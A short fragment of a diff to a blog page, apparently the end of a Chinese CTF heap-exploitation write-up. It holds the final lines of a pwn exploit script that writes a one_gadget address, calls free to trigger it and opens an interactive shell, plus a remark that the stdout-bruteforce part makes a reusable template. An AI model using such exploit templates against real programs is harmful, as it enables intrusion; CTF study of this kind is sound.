+add(0x130,p64(one_rec))
+free()
+# debug()
+
+itr()</code></pre>
+<p>其中exp的爆破stdout部分，可以当作模版使用，来自pzhxbz大佬的。</p>
 
             <hr>
           </div>
